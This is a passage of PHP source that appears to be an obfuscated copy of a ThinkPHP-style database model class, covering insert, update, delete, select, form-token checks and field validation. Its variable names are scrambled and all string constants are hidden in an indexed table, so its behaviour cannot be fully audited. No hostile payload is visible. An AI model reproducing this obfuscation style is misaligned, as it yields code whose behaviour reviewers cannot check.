$this->scope($§îÏ¡Ã’, $ã×Î³ÎØ[0]); } elseif (method_exists($this, $§îÏ¡Ã’)) { array_unshift($ã×Î³ÎØ, $§îÏ¡Ã’); return call_user_func_array(array($this, $ÅÜÙöÑ¸[353]), $ã×Î³ÎØ); } else { return call_user_func_array(array(parent, $§îÏ¡Ã’), $ã×Î³ÎØ); } } protected function call() { $£¹†Ù¹ =& $_SERVER[äô®•½Â]; $÷˜‡‡ª = func_get_args(); $³ö¼Á‹ü = array_shift($÷˜‡‡ª); $ùÚ¾êÇª = $³ö¼Á‹ü; if (is_array($³ö¼Á‹ü)) { $ùÚ¾êÇª = $³ö¼Á‹ü[1]; $³ö¼Á‹ü = $³ö¼Á‹ü[0]; } $™Æğ’œÙ = count($÷˜‡‡ª) - 1; if (isset($÷˜‡‡ª[$™Æğ’œÙ]) && $÷˜‡‡ª[$™Æğ’œÙ] === $³ö¼Á‹ü) { think_exception(__CLASS__ . $£¹†Ù¹[4] . $³ö¼Á‹ü . think_lang($£¹†Ù¹[354])); return; } $÷˜‡‡ª[] = $³ö¼Á‹ü; if (method_exists($this, $£¹†Ù¹[355])) { $’çßÒ—¿ = call_user_func_array(array($this, $£¹†Ù¹[356]), array($ùÚ¾êÇª, $÷˜‡‡ª)); if (!is_null($’çßÒ—¿) && $’çßÒ—¿ !== !1) { return $’çßÒ—¿; } } $€İçÒ•ˆ = call_user_func_array(array($this, $³ö¼Á‹ü), $÷˜‡‡ª); if (method_exists($this, $£¹†Ù¹[357])) { $’çßÒ—¿ = call_user_func_array(array($this, $£¹†Ù¹[358]), array($ùÚ¾êÇª, $÷˜‡‡ª, $€İçÒ•ˆ)); if ($’çßÒ—¿) { return $’çßÒ—¿; } } return $€İçÒ•ˆ; } protected function _initialize() { } protected function _facade($¤ñÍ¢º) { $íôè·¸ø =& $_SERVER[äô®•½Â]; if (!empty($this->fields)) { foreach ($¤ñÍ¢º as $ï•‰†ì => $Ô¤ô¼­») { if (is_array($this->fields) && !in_array($ï•‰†ì, $this->fields, !0)) { unset($¤ñÍ¢º[$ï•‰†ì]); } elseif (is_scalar($Ô¤ô¼­»)) { $this->_parseType($¤ñÍ¢º, $ï•‰†ì); } } } if (!empty($this->options[$íôè·¸ø[359]])) { $¤ñÍ¢º = array_map($this->options[$íôè·¸ø[359]], $¤ñÍ¢º); unset($this->options[$íôè·¸ø[359]]); } $this->_beforeWrite($¤ñÍ¢º); return $¤ñÍ¢º; } protected function _beforeWrite(&$ùú¿ Æ) { } public function add($Ú¦ñÈÃí = '', $êá¬Åæ¹ = array(), $ã§¦Œªè = false) { if (empty($Ú¦ñÈÃí)) { if (!empty($this->data)) { $Ú¦ñÈÃí = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[äô®•½Â][360]); return !1; } } $êá¬Åæ¹ = $this->_parseOptions($êá¬Åæ¹); $Ú¦ñÈÃí = $this->_facade($Ú¦ñÈÃí); if (!1 === $this->_beforeInsert($Ú¦ñÈÃí, $êá¬Åæ¹)) { return !1; } $×€º±µ˜ = $this->db->insert($Ú¦ñÈÃí, $êá¬Åæ¹, $ã§¦Œªè); if (!1 !== $×€º±µ˜) { $®ğ¦š’“ = $this->getLastInsID(); if ($®ğ¦š’“) { $Ú¦ñÈÃí[$this->getPk()] = $®ğ¦š’“; $this->_after_insert($Ú¦ñÈÃí, $êá¬Åæ¹); return $®ğ¦š’“; } $this->_after_insert($Ú¦ñÈÃí, $êá¬Åæ¹); } return $×€º±µ˜; } protected function _beforeInsert(&$¥ñùóœ´, $÷¤ù€¥à) { } protected function _after_insert($¢¬±ß­å, $ŸÀ‹øØŠ) { } public function addAll($×ˆ–Éóì, $×¨Ø¤š = array(), $Êå¶Æ½ = false) { $ºÎ©¨õç =& $_SERVER[äô®•½Â]; if (empty($×ˆ–Éóì)) { $this->error = think_lang($ºÎ©¨õç[360]); return !1; } $×¨Ø¤š = $this->_parseOptions($×¨Ø¤š); foreach ($×ˆ–Éóì as $æÖƒ´ => $œ£±ÕÆ¶) { $×ˆ–Éóì[$æÖƒ´] = $this->_facade($œ£±ÕÆ¶); } if (method_exists($this->db, $ºÎ©¨õç[361])) { $Œ¹É®¹‘ = $this->db->insertAll($×ˆ–Éóì, $×¨Ø¤š, $Êå¶Æ½); } else { $this->startTrans(); foreach ($×ˆ–Éóì as $æÖƒ´ => $œ£±ÕÆ¶) { $Œ¹É®¹‘ = $this->db->insert($œ£±ÕÆ¶, $×¨Ø¤š, $Êå¶Æ½); } $this->commit(); } if (!1 !== $Œ¹É®¹‘) { $ã„ÉŞ ¯ = $this->getLastInsID(); if ($ã„ÉŞ ¯) { return $ã„ÉŞ ¯; } } return $Œ¹É®¹‘; } public function selectAdd($–ê–Üº§ = '', $ŸÓÒ¯’Ô = '', $èê¢’”Ö = array()) { $Í”™¤ÑÚ =& $_SERVER[äô®•½Â]; $èê¢’”Ö = $this->_parseOptions($èê¢’”Ö); if (!1 === ($­Â¿»·— = $this->db->selectInsert($–ê–Üº§ ? $–ê–Üº§ : $èê¢’”Ö[$Í”™¤ÑÚ[362]], $ŸÓÒ¯’Ô ? $ŸÓÒ¯’Ô : $this->getTableName(), $èê¢’”Ö))) { $this->error = think_lang($Í”™¤ÑÚ[363]); return !1; } else { return $­Â¿»·—; } } public function save($´ËˆÏ» = '', $¥æƒ³¶Š = array()) { $ùäÖß‹¿ =& $_SERVER[äô®•½Â]; if (empty($´ËˆÏ»)) { if (!empty($this->data)) { $´ËˆÏ» = $this->data; $this->data = array(); } else { $this->error = think_lang($ùäÖß‹¿[360]); return !1; } } $´ËˆÏ» = $this->_facade($´ËˆÏ»); $¥æƒ³¶Š = $this->_parseOptions($¥æƒ³¶Š); $üŒ¯Ê¸ô = $this->getPk(); if (!isset($¥æƒ³¶Š[$ùäÖß‹¿[364]])) { if (isset($´ËˆÏ»[$üŒ¯Ê¸ô])) { $ÃÔœç¦Ÿ[$üŒ¯Ê¸ô] = $´ËˆÏ»[$üŒ¯Ê¸ô]; $¥æƒ³¶Š[$ùäÖß‹¿[364]] = $ÃÔœç¦Ÿ; unset($´ËˆÏ»[$üŒ¯Ê¸ô]); } else { $this->error = think_lang($ùäÖß‹¿[363]); return !1; } } if (is_array($¥æƒ³¶Š[$ùäÖß‹¿[364]]) && isset($¥æƒ³¶Š[$ùäÖß‹¿[364]][$üŒ¯Ê¸ô])) { $ª’ëÓ–£ = $¥æƒ³¶Š[$ùäÖß‹¿[364]][$üŒ¯Ê¸ô]; } if (!1 === $this->_beforeUpdate($´ËˆÏ», $¥æƒ³¶Š)) { return !1; } $Ô±–×ÌØ = $this->db->update($´ËˆÏ», $¥æƒ³¶Š); if (!1 !== $Ô±–×ÌØ) { if (isset($ª’ëÓ–£)) { $´ËˆÏ»[$üŒ¯Ê¸ô] = $ª’ëÓ–£; } $this->_afterUpdate($´ËˆÏ», $¥æƒ³¶Š); } return $Ô±–×ÌØ; } protected function _beforeUpdate(&$Í˜˜Ÿı, $åÇÕù°) { } protected function _afterUpdate($á¬³‰Ø†, $­—¨Îè) { } public function delete($Íç®ç ‰ = array()) { $şÂúççÄ =& $_SERVER[äô®•½Â]; if (empty($Íç®ç ‰) && empty($this->options[$şÂúççÄ[364]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $±ô€µª™ = $this->getPk(); if (is_numeric($Íç®ç ‰) || is_string($Íç®ç ‰)) { if (strpos($Íç®ç ‰, $şÂúççÄ[50])) { $¥ª™Şúƒ[$±ô€µª™] = array($şÂúççÄ[365], $Íç®ç ‰); } else { $¥ª™Şúƒ[$±ô€µª™] = $Íç®ç ‰; } $this->options[$şÂúççÄ[364]] = $¥ª™Şúƒ; } $Íç®ç ‰ = $this->_parseOptions(); if (is_array($Íç®ç ‰[$şÂúççÄ[364]]) && isset($Íç®ç ‰[$şÂúççÄ[364]][$±ô€µª™])) { $ƒ›õß£¼ = $Íç®ç ‰[$şÂúççÄ[364]][$±ô€µª™]; } $ïÙ†ˆÏ² = $this->db->delete($Íç®ç ‰); if (!1 !== $ïÙ†ˆÏ²) { $‡ªšÈÌá = array(); if (isset($ƒ›õß£¼)) { $‡ªšÈÌá[$±ô€µª™] = $ƒ›õß£¼; } $this->_after_delete($‡ªšÈÌá, $Íç®ç ‰); } return $ïÙ†ˆÏ²; } protected function _after_delete($óåÛ³ßÜ, $¿¤È˜ÚØ) { } public function select($Ïö†ñÆ = array()) { $†æõÏØŒ =& $_SERVER[äô®•½Â]; if (is_string($Ïö†ñÆ) || is_numeric($Ïö†ñÆ)) { $ «ƒŞÄã = $this->getPk(); if (strpos($Ïö†ñÆ, $†æõÏØŒ[50])) { $ÙÉü¡Û¦[$ «ƒŞÄã] = array($†æõÏØŒ[365], $Ïö†ñÆ); } else { $ÙÉü¡Û¦[$ «ƒŞÄã] = $Ïö†ñÆ; } $this->options[$†æõÏØŒ[364]] = $ÙÉü¡Û¦; } elseif (!1 === $Ïö†ñÆ) { $Ïö†ñÆ = $this->_parseOptions(); return $†æõÏØŒ[366] . $this->db->buildSelectSql($Ïö†ñÆ) . $†æõÏØŒ[367]; } $Ïö†ñÆ = $this->_parseOptions(); $¬¦ ½şà = $this->db->select($Ïö†ñÆ); if (!1 === $¬¦ ½şà) { return !1; } if (empty($¬¦ ½şà)) { return null; } $this->_afterSelect($¬¦ ½şà, $Ïö†ñÆ); return $¬¦ ½şà; } protected function _afterSelect(&$â›ÒÂÊ£, $§¤Êœ§â) { } public function buildSql($±şŸÏ• = array()) { $ÙÏ¸¢œ“ =& $_SERVER[äô®•½Â]; $±şŸÏ• = $this->_parseOptions($±şŸÏ•); return $ÙÏ¸¢œ“[366] . $this->db->buildSelectSql($±şŸÏ•) . $ÙÏ¸¢œ“[367]; } public function optionsValue($®‚ı°áå = null) { if (is_null($®‚ı°áå)) { return $this->options; } elseif (is_array($®‚ı°áå)) { $this->options = array_merge($this->options, $®‚ı°áå); } } protected function _parseOptions($€ìÚûøü = array()) { $•÷š”É¸ =& $_SERVER[äô®•½Â]; if (is_array($€ìÚûøü)) { $€ìÚûøü = array_merge($this->options, $€ìÚûøü); } $this->options = array(); if (!isset($€ìÚûøü[$•÷š”É¸[368]])) { $€ìÚûøü[$•÷š”É¸[368]] = $this->getTableName(); $ñâó³‘Œ = $this->fields; } else { $ñâó³‘Œ = $this->getDbFields(); } if (!empty($€ìÚûøü[$•÷š”É¸[369]])) { $€ìÚûøü[$•÷š”É¸[368]] .= $•÷š”É¸[53] . $€ìÚûøü[$•÷š”É¸[369]]; } $€ìÚûøü[$•÷š”É¸[370]] = $this->name; if (isset($€ìÚûøü[$•÷š”É¸[364]]) && is_array($€ìÚûøü[$•÷š”É¸[364]]) && !empty($ñâó³‘Œ) && !isset($€ìÚûøü[$•÷š”É¸[371]]) && !isset($€ìÚûøü[$•÷š”É¸[368]])) { foreach ($€ìÚûøü[$•÷š”É¸[364]] as $½ˆ¥şáô => $©­øí÷‚) { $½ˆ¥şáô = trim($½ˆ¥şáô); if (in_array($½ˆ¥şáô, $ñâó³‘Œ, !0)) { if (is_scalar($©­øí÷‚)) { $this->_parseType($€ìÚûøü[$•÷š”É¸[364]], $½ˆ¥şáô); } } elseif (!is_numeric($½ˆ¥şáô) && $•÷š”É¸[11] != substr($½ˆ¥şáô, 0, 1) && !1 === strpos($½ˆ¥şáô, $•÷š”É¸[10]) && !1 === strpos($½ˆ¥şáô, $•÷š”É¸[349]) && !1 === strpos($½ˆ¥şáô, $•÷š”É¸[215]) && !1 === strpos($½ˆ¥şáô, $•÷š”É¸[287])) { unset($€ìÚûøü[$•÷š”É¸[364]][$½ˆ¥şáô]); } } } $this->_options_filter($€ìÚûøü); return $€ìÚûøü; } protected function _options_filter(&$ˆïâÀ”Ô) { } protected function _parseType(&$ò›ˆÅ´­, $¡î„™Â²) { $ÅÉèŒˆº =& $_SERVER[äô®•½Â]; if (empty($this->options[$ÅÉèŒˆº[372]][$ÅÉèŒˆº[4] . $¡î„™Â²])) { $‚ËàüŸ = strtolower($this->fields[$ÅÉèŒˆº[341]][$¡î„™Â²]); if (!1 !== strpos($‚ËàüŸ, $ÅÉèŒˆº[373])) { } elseif (!1 === strpos($‚ËàüŸ, $ÅÉèŒˆº[374]) && !1 !== strpos($‚ËàüŸ, $ÅÉèŒˆº[375])) { $ò›ˆÅ´­[$¡î„™Â²] = intval($ò›ˆÅ´­[$¡î„™Â²]); } elseif (!1 !== strpos($‚ËàüŸ, $ÅÉèŒˆº[376]) || !1 !== strpos($‚ËàüŸ, $ÅÉèŒˆº[377])) { $ò›ˆÅ´­[$¡î„™Â²] = floatval($ò›ˆÅ´­[$¡î„™Â²]); } elseif (!1 !== strpos($‚ËàüŸ, $ÅÉèŒˆº[378])) { $ò›ˆÅ´­[$¡î„™Â²] = (bool) $ò›ˆÅ´­[$¡î„™Â²]; } } } public function find($»ô³¸Æ¼ = array()) { $şöšÆË• =& $_SERVER[äô®•½Â]; if (is_numeric($»ô³¸Æ¼) || is_string($»ô³¸Æ¼)) { $àğŠ€º[$this->getPk()] = intval($»ô³¸Æ¼); $this->options[$şöšÆË•[364]] = $àğŠ€º; } $this->options[$şöšÆË•[379]] = 1; $»ô³¸Æ¼ = $this->_parseOptions(); $¢îùñˆ = $this->db->select($»ô³¸Æ¼); if (!1 === $¢îùñˆ) { return !1; } if (empty($¢îùñˆ)) { return null; } $¨ÔÌûòÀ = $¢îùñˆ[0]; $this->_afterFind($¨ÔÌûòÀ, $»ô³¸Æ¼); return $¨ÔÌûòÀ; } protected function _afterFind(&$ùûØöÁŸ, $œßç¸é) { } protected function returnResult($¶»Œé², $ŸÒ‘Æ„® = '') { $òœà€Ï  =& $_SERVER[äô®•½Â]; if ($ŸÒ‘Æ„®) { if (is_callable($ŸÒ‘Æ„®)) { return call_user_func($ŸÒ‘Æ„®, $¶»Œé²); } switch (strtolower($ŸÒ‘Æ„®)) { case $òœà€Ï [380]: return json_encode($¶»Œé²); case $òœà€Ï [381]: return xml_encode($¶»Œé²); } } return $¶»Œé²; } public function parseFieldsMap($¶â·«šó, $ó¨ÎÈ‘ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $„²ŞÉ¥ => $Êñ¥ã¸) { if ($ó¨ÎÈ‘ == 1) { if (isset($¶â·«šó[$Êñ¥ã¸])) { $¶â·«šó[$„²ŞÉ¥] = $¶â·«šó[$Êñ¥ã¸]; unset($¶â·«šó[$Êñ¥ã¸]); } } else { if (isset($¶â·«šó[$„²ŞÉ¥])) { $¶â·«šó[$Êñ¥ã¸] = $¶â·«šó[$„²ŞÉ¥]; unset($¶â·«šó[$„²ŞÉ¥]); } } } } return $¶â·«šó; } public function setField($ßöÎÑ›, $øãÜÍ‚ª = '') { if (is_array($ßöÎÑ›)) { $Åæİ„§Ñ = $ßöÎÑ›; } else { $Åæİ„§Ñ[$ßöÎÑ›] = $øãÜÍ‚ª; } return $this->save($Åæİ„§Ñ); } public function setAdd($ƒëÁ®À®, $—Ûù’õ¶ = 1) { $œõê­üè =& $_SERVER[äô®•½Â]; $ÁÀ€“âŞ = $ƒëÁ®À® . $œõê­üè[382] . $—Ûù’õ¶; if ($—Ûù’õ¶ < 0) { $ÁÀ€“âŞ = $ƒëÁ®À® . $—Ûù’õ¶; } return $this->setField($ƒëÁ®À®, array($œõê­üè[383], $ÁÀ€“âŞ)); } public function getField($×ë–Š¿Ñ, $òçÄÏü = null) { $Ëğğ’Å =& $_SERVER[äô®•½Â]; $ó—ŒÌÃŸ[$Ëğğ’Å[362]] = $×ë–Š¿Ñ; $ó—ŒÌÃŸ = $this->_parseOptions($ó—ŒÌÃŸ); $×ë–Š¿Ñ = trim($×ë–Š¿Ñ); if (strpos($×ë–Š¿Ñ, $Ëğğ’Å[50])) { if (!isset($ó—ŒÌÃŸ[$Ëğğ’Å[379]])) { $ó—ŒÌÃŸ[$Ëğğ’Å[379]] = is_numeric($òçÄÏü) ? $òçÄÏü : $Ëğğ’Å[12]; } $ÅŒæ×¼´ = $this->db->select($ó—ŒÌÃŸ); if (!empty($ÅŒæ×¼´)) { $É°ªëè = explode($Ëğğ’Å[50], $×ë–Š¿Ñ); $×ë–Š¿Ñ = array_keys($ÅŒæ×¼´[0]); $ÇÏğÆ½ = array_shift($×ë–Š¿Ñ); $€èıÀá‰ = array_shift($×ë–Š¿Ñ); $‡ÍÜ¯®Ø = array(); $çÙÄÇÕ = count($É°ªëè); foreach ($ÅŒæ×¼´ as $´àõ«…û) { $ ²ÒÄæü = $´àõ«…û[$ÇÏğÆ½]; if (2 == $çÙÄÇÕ) { $‡ÍÜ¯®Ø[$ ²ÒÄæü] = $´àõ«…û[$€èıÀá‰]; } else { $‡ÍÜ¯®Ø[$ ²ÒÄæü] = is_string($òçÄÏü) ? implode($òçÄÏü, $´àõ«…û) : $´àõ«…û; } } return $‡ÍÜ¯®Ø; } } else { if (!0 !== $òçÄÏü) { $ó—ŒÌÃŸ[$Ëğğ’Å[379]] = is_numeric($òçÄÏü) ? $òçÄÏü : 1; } if ($òçÄÏü === $Ëğğ’Å[344]) { unset($ó—ŒÌÃŸ[$Ëğğ’Å[379]]); } $´àõ«…û = $this->db->select($ó—ŒÌÃŸ); if (!empty($´àõ«…û)) { if ($òçÄÏü === $Ëğğ’Å[344]) { return reset($´àõ«…û[0]); } if (!0 !== $òçÄÏü && 1 == $ó—ŒÌÃŸ[$Ëğğ’Å[379]]) { return reset($´àõ«…û[0]); } foreach ($´àõ«…û as $ î·ØÖ) { $æŸ Áâ[] = $ î·ØÖ[$×ë–Š¿Ñ]; } return $æŸ Áâ; } } return null; } public function create($®Ä¯“¾¼ = '', $ŞÃì­Ï¸ = '') { $ÄŒ±Æ¦ =& $_SERVER[äô®•½Â]; if (empty($®Ä¯“¾¼)) { $®Ä¯“¾¼ = $_POST; } elseif (is_object($®Ä¯“¾¼)) { $®Ä¯“¾¼ = get_object_vars($®Ä¯“¾¼); } if (empty($®Ä¯“¾¼) || !is_array($®Ä¯“¾¼)) { $this->error = think_lang($ÄŒ±Æ¦[360]); return !1; } $®Ä¯“¾¼ = $this->parseFieldsMap($®Ä¯“¾¼, 0); $ŞÃì­Ï¸ = $ŞÃì­Ï¸ ? $ŞÃì­Ï¸ : (!empty($®Ä¯“¾¼[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ÄŒ±Æ¦[362]])) { $ê’Ø—ß = $this->options[$ÄŒ±Æ¦[362]]; unset($this->options[$ÄŒ±Æ¦[362]]); } elseif ($ŞÃì­Ï¸ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ê’Ø—ß = $this->insertFields; } elseif ($ŞÃì­Ï¸ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ê’Ø—ß = $this->updateFields; } if (isset($ê’Ø—ß)) { if (is_string($ê’Ø—ß)) { $ê’Ø—ß = explode($ÄŒ±Æ¦[50], $ê’Ø—ß); } if (think_config($ÄŒ±Æ¦[384])) { $ê’Ø—ß[] = think_config($ÄŒ±Æ¦[385]); } foreach ($®Ä¯“¾¼ as $×²•›–Ë => $»Øüéƒé) { if (!in_array($×²•›–Ë, $ê’Ø—ß)) { unset($®Ä¯“¾¼[$×²•›–Ë]); } } } if (!$this->autoValidation($®Ä¯“¾¼, $ŞÃì­Ï¸)) { return !1; } if (!$this->autoCheckToken($®Ä¯“¾¼)) { $this->error = think_lang($ÄŒ±Æ¦[386]); return !1; } if ($this->autoCheckFields) { $ê’Ø—ß = $this->getDbFields(); foreach ($®Ä¯“¾¼ as $×²•›–Ë => $»Øüéƒé) { if (!in_array($×²•›–Ë, $ê’Ø—ß)) { unset($®Ä¯“¾¼[$×²•›–Ë]); } elseif (MAGIC_QUOTES_GPC && is_string($»Øüéƒé)) { $®Ä¯“¾¼[$×²•›–Ë] = stripslashes($»Øüéƒé); } } } $this->autoOperation($®Ä¯“¾¼, $ŞÃì­Ï¸); $this->data = $®Ä¯“¾¼; return $®Ä¯“¾¼; } public function autoCheckToken($ôì‰ˆãá) { $©¤€¯ =& $_SERVER[äô®•½Â]; if (isset($this->options[$©¤€¯[387]]) && !$this->options[$©¤€¯[387]]) { return !0; } if (think_config($©¤€¯[384])) { $òãö€è° = think_config($©¤€¯[385]); if (!isset($ôì‰ˆãá[$òãö€è°]) || Session::get($òãö€è°)) { return !1; } list($ÀÕáÕ­ë, $˜Îãº‡Û) = explode($©¤€¯[11], $ôì‰ˆãá[$òãö€è°]); if ($˜Îãº‡Û && Session::get($òãö€è° . $©¤€¯[10] . $ÀÕáÕ­ë) === $˜Îãº‡Û) { Session::remove($òãö€è° . $©¤€¯[10] . $ÀÕáÕ­ë); return !0; } if (think_config($©¤€¯[388])) { Session::remove($òãö€è° . $©¤€¯[10] . $ÀÕáÕ­ë); } return !1; } return !0; } public function regex($ì®æ¼†, $Öé¾İÅé) { $é‘Ñ¡à =& $_SERVER[äô®•½Â]; $ºáè¾ å = array($é‘Ñ¡à[389] => $é‘Ñ¡à[390], $é‘Ñ¡à[391] => $é‘Ñ¡à[392], $é‘Ñ¡à[393] => $é‘Ñ¡à[394], $é‘Ñ¡à[395] => $é‘Ñ¡à[396], $é‘Ñ¡à[397] => $é‘Ñ¡à[398], $é‘Ñ¡à[399] => $é‘Ñ¡à[400], $é‘Ñ¡à[401] => $é‘Ñ¡à[402], $é‘Ñ¡à[377] => $é‘Ñ¡à[403], $é‘Ñ¡à[404] => $é‘Ñ¡à[405]); if (isset($ºáè¾ å[strtolower($Öé¾İÅé)])) { $Öé¾İÅé = $ºáè¾ å[strtolower($Öé¾İÅé)]; } return preg_match($Öé¾İÅé, $ì®æ¼†) === 1; } private function autoOperation(&$ĞûğâÉ½, $ÉÜªĞ‹¤) { $ÄíöµÜ =& $_SERVER[äô®•½Â]; if (!empty($this->options[$ÄíöµÜ[406]])) { $ß³Ğ®‰ = $this->options[$ÄíöµÜ[406]]; unset($this->options[$ÄíöµÜ[406]]); } elseif (!empty($this->_auto)) { $ß³Ğ®‰ = $this->_auto; } if (isset($ß³Ğ®‰)) { foreach ($ß³Ğ®‰ as $Ê‰™ÔáÁ) { if (empty($Ê‰™ÔáÁ[2])) { $Ê‰™ÔáÁ[2] = THINK_MODEL_INSERT; } if ($ÉÜªĞ‹¤ == $Ê‰™ÔáÁ[2] || $Ê‰™ÔáÁ[2] == THINK_MODEL_BOTH) { switch (trim($Ê‰™ÔáÁ[3])) { case $ÄíöµÜ[407]: case $ÄíöµÜ[408]: $™ıÖŸú = isset($Ê‰™ÔáÁ[4]) ? (array) $Ê‰™ÔáÁ[4] : array(); if (isset($ĞûğâÉ½[$Ê‰™ÔáÁ[0]])) { array_unshift($™ıÖŸú, $ĞûğâÉ½[$Ê‰™ÔáÁ[0]]); } if ($ÄíöµÜ[407] == $Ê‰™ÔáÁ[3]) { $ĞûğâÉ½[$Ê‰™ÔáÁ[0]] = call_user_func_array($Ê‰™ÔáÁ[1], $™ıÖŸú); } else { $ĞûğâÉ½[$Ê‰™ÔáÁ[0]] = call_user_func_array(array(&$this, $Ê‰™ÔáÁ[1]), $™ıÖŸú); } break; case $ÄíöµÜ[362]: $ĞûğâÉ½[$Ê‰™ÔáÁ[0]] = $ĞûğâÉ½[$Ê‰™ÔáÁ[1]]; break; case $ÄíöµÜ[409]: if ($ÄíöµÜ[12] === $ĞûğâÉ½[$Ê‰™ÔáÁ[0]]) { unset($ĞûğâÉ½[$Ê‰™ÔáÁ[0]]); } break; case $ÄíöµÜ[410]: default: $ĞûğâÉ½[$Ê‰™ÔáÁ[0]] = $Ê‰™ÔáÁ[1]; } if (!1 === $ĞûğâÉ½[$Ê‰™ÔáÁ[0]]) { unset($ĞûğâÉ½[$Ê‰™ÔáÁ[0]]); } } } } return $ĞûğâÉ½; } protected function autoValidation($ŠêÒËòÙ, $Ÿ™Îú’ë) { $á‡¯ı‘Ã =& $_SERVER[äô®•½Â]; if (!empty($this->options[$á‡¯ı‘Ã[411]])) { $ÖÈß˜»¿ = $this->options[$á‡¯ı‘Ã[411]]; unset($this->options[$á‡¯ı‘Ã[411]]); } elseif (!empty($this->_validate)) { $ÖÈß˜»¿ = $this->_validate; } if (isset($ÖÈß˜»¿)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÖÈß˜»¿ as $§é¥°Ğ¢ => $¿à¡½”) { if (empty($¿à¡½”[5]) || $¿à¡½”[5] == THINK_MODEL_BOTH || $¿à¡½”[5] == $Ÿ™Îú’ë) { if (0 == strpos($¿à¡½”[2], $á‡¯ı‘Ã[412]) && strpos($¿à¡½”[2], $á‡¯ı‘Ã[413])) { $¿à¡½”[2] = think_lang(substr($¿à¡½”[2], 2, -1)); } $¿à¡½”[3] = isset($¿à¡½”[3]) ? $¿à¡½”[3] : THINK_EXISTS_VALIDATE; $¿à¡½”[4] = isset($¿à¡½”[4]) ? $¿à¡½”[4] : $á‡¯ı‘Ã[414]; switch ($¿à¡½”[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ŠêÒËòÙ, $¿à¡½”)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($á‡¯ı‘Ã[12] != trim($ŠêÒËòÙ[$¿à¡½”[0]])) { if (!1 === $this->_validationField($ŠêÒËòÙ, $¿à¡½”)) { return !1; } } break; default: if (isset($ŠêÒËòÙ[$¿à¡½”[0]])) { if (!1 === $this->_validationField($ŠêÒËòÙ, $¿à¡½”)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Ä¡ÈÑ…, $Ú«ç…) { if (!1 === $this->_validationFieldItem($Ä¡ÈÑ…, $Ú«ç…)) { if ($this->patchValidate) { $this->error[$Ú«ç…[0]] = $Ú«ç…[2]; } else { $this->error = $Ú«ç…[2]; return !1; } } return; } protected function _validationFieldItem($Î·©—‘, $ŠÕ¨¦Êí) { $–ŸËâÉ¬ =& $_SERVER[äô®•½Â]; switch (strtolower(trim($ŠÕ¨¦Êí[4]))) { case $–ŸËâÉ¬[407]: case $–ŸËâÉ¬[408]: $Šâñà¾“ = isset($ŠÕ¨¦Êí[6]) ? (array) $ŠÕ¨¦Êí[6] : array(); if (is_string($ŠÕ¨¦Êí[0]) && strpos($ŠÕ¨¦Êí[0], $–ŸËâÉ¬[50])) { $ŠÕ¨¦Êí[0] = explode($–ŸËâÉ¬[50], $ŠÕ¨¦Êí[0]); } if (is_array($ŠÕ¨¦Êí[0])) { foreach ($ŠÕ¨¦Êí[0] as $ˆ˜…÷ƒÄ) { $Àá—¤”[$ˆ˜…÷ƒÄ] = $Î·©—‘[$ˆ˜…÷ƒÄ]; } array_unshift($Šâñà¾“, $Àá—¤”); } else { array_unshift($Šâñà¾“, $Î·©—‘[$ŠÕ¨¦Êí[0]]); } if ($–ŸËâÉ¬[407] == $ŠÕ¨¦Êí[4]) { return call_user_func_array($ŠÕ¨¦Êí[1], $Šâñà¾“); } else { return call_user_func_array(array(&$this, $ŠÕ¨¦Êí[1]), $Šâñà¾“); } case $–ŸËâÉ¬[415]: return $Î·©—‘[$ŠÕ¨¦Êí[0]] == $Î·©—‘[$ŠÕ¨¦Êí[1]]; case $–ŸËâÉ¬[416]: if (is_string($ŠÕ¨¦Êí[0]) && strpos($ŠÕ¨¦Êí[0], $–ŸËâÉ¬[50])) { $ŠÕ¨¦Êí[0] = explode($–ŸËâÉ¬[50], $ŠÕ¨¦Êí[0]); } $Àü²¤à° = array(); if (is_array($ŠÕ¨¦Êí[0])) { foreach ($ŠÕ¨¦Êí[0] as $ˆ˜…÷ƒÄ) { $Àü²¤à°[$ˆ˜…÷ƒÄ] = $Î·©—‘[$ˆ˜…÷ƒÄ]; } } else { $Àü²¤à°[$ŠÕ¨¦Êí[0]] = $Î·©—‘[$ŠÕ¨¦Êí[0]]; } if (!empty($Î·©—‘[$this->getPk()])) { $Àü²¤à°[$this->getPk()] = array($–ŸËâÉ¬[417], $Î·©—‘[$this->getPk()]); } if ($this->where($Àü²¤à°)->find()) { return !1; } return !0; default: return $this->check($Î·©—‘[$ŠÕ¨¦Êí[0]], $ŠÕ¨¦Êí[1], $ŠÕ¨¦Êí[4]); } } public function check($Ê¡”¼„ê, $æÏ£‹, $¿­Â•î“ = "\x72\x65\147\x65\170") { $œéè¸ÅÕ =& $_SERVER[äô®•½Â]; $¿­Â•î“ = strtolower(trim($¿­Â•î“)); switch ($¿­Â•î“) { case $œéè¸ÅÕ[7]: case $œéè¸ÅÕ[418]: $òü´£‰• = is_array($æÏ£‹) ? $æÏ£‹ : explode($œéè¸ÅÕ[50], $æÏ£‹); return $¿­Â•î“ == $œéè¸ÅÕ[7] ? in_array($Ê¡”¼„ê, $òü´£‰•) : !in_array($Ê¡”¼„ê, $òü´£‰•); case $œéè¸ÅÕ[419]: case $œéè¸ÅÕ[420]: if (is_array($æÏ£‹)) { $ŒÚş‹Á = $æÏ£‹[0]; $ˆÓâŠË‰ = $æÏ£‹[1]; } else { list($ŒÚş‹Á, $ˆÓâŠË‰) = explode($œéè¸ÅÕ[50], $æÏ£‹); } return $¿­Â•î“ == $œéè¸ÅÕ[419] ? $Ê¡”¼„ê >= $ŒÚş‹Á && $Ê¡”¼„ê <= $ˆÓâŠË‰ : $Ê¡”¼„ê < $ŒÚş‹Á || $Ê¡”¼„ê > $ˆÓâŠË‰; case $œéè¸ÅÕ[421]: case $œéè¸ÅÕ[422]: return $¿­Â•î“ == $œéè¸ÅÕ[421] ? $Ê¡”¼„ê == $æÏ£‹ : $Ê¡”¼„ê != $æÏ£‹; case $œéè¸ÅÕ[423]: $—ñå Òô = mb_strlen($Ê¡”¼„ê, $œéè¸ÅÕ[424]); if (strpos($æÏ£‹, 